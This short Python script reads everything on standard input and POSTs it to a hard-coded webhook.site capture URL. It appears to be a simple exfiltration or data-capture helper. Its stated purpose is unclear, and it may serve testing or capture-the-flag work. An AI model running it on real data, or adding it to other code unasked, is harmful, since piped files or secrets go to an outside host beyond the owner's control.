import sys
from urllib.request import urlopen
from urllib.parse import urlencode


url = 'https://webhook.site/65e6343d-5117-4178-92fb-00b19a81b288'


line = sys.stdin.read()

data = {
    'data': line
}

post_data = urlencode(data).encode('ascii')

r = urlopen(url, post_data)